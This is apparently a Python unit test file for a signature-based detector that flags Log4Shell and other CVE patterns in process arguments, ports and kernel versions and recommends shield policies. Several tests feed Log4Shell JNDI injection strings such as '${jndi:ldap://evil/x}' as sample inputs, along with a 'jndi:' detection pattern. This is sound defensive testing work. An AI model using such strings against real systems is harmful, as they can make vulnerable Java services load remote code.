import unittest

from aegis.signature.cve import Signature, load_signatures
from aegis.signature.detector import Detection, SignatureDetector
from aegis.signature.matcher import Matcher
from aegis.signature.recommend import recommend_shield


class TestLoadSignatures(unittest.TestCase):
    def test_loads_all(self):
        sigs = load_signatures()
        self.assertGreaterEqual(len(sigs), 5)
        ids = {s.id for s in sigs}
        self.assertIn("log4shell", ids)


class TestSignatureMatches(unittest.TestCase):
    def test_argv_pattern(self):
        sig = Signature(id="t", name="t", cve="CVE-X", argv_patterns=[r"jndi:"])
        hits = sig.matches({"argv": ["${jndi:ldap://x}"]})
        self.assertIn("argv", hits)

    def test_process_match(self):
        sig = Signature(id="t", name="t", cve="CVE-X", process=["java"])
        self.assertIn("process", sig.matches({"process": "java"}))
        self.assertEqual(sig.matches({"process": "nginx"}), {})

    def test_ports_match(self):
        sig = Signature(id="t", name="t", cve="CVE-X", ports=[389])
        self.assertIn("ports", sig.matches({"ports": [389, 443]}))

    def test_kernel_lt(self):
        sig = Signature(id="t", name="t", cve="CVE-X", kernel_lt="5.10")
        self.assertIn("kernel", sig.matches({"kernel": "5.4.0-100-generic"}))


class TestDetector(unittest.TestCase):
    def test_scan_log4shell(self):
        dets = SignatureDetector().scan(
            {"cmdline": "java -jar app.jar",
             "argv": ["java", "-jar", "app.jar", "${jndi:ldap://evil/x}"]})
        self.assertTrue(any(d.signature_id == "log4shell" for d in dets))

    def test_scan_confidence(self):
        dets = SignatureDetector().scan({"argv": ["${jndi:ldap://x}"]})
        self.assertTrue(all(0.0 <= d.confidence <= 1.0 for d in dets))

    def test_severity_sorted(self):
        dets = SignatureDetector().scan({"argv": ["${jndi:ldap://x}"]})
        if len(dets) >= 2:
            rank = {"critical": 3, "high": 2, "medium": 1, "low": 0}
            vals = [rank.get(d.severity, 0) for d in dets]
            self.assertEqual(vals, sorted(vals, reverse=True))


class TestMatcher(unittest.TestCase):
    def test_match(self):
        m = Matcher()
        out = m.match({"argv": ["${jndi:ldap://x}"]})
        self.assertTrue(any(s.id == "log4shell" for s, _ in out))


class TestRecommend(unittest.TestCase):
    def test_recommend(self):
        dets = SignatureDetector().scan({"argv": ["${jndi:ldap://x}"]})
        det = next(d for d in dets if d.signature_id == "log4shell")
        policy = recommend_shield(det)
        self.assertIn("name", policy)
        self.assertTrue(policy["rules"])


if __name__ == "__main__":
    unittest.main()
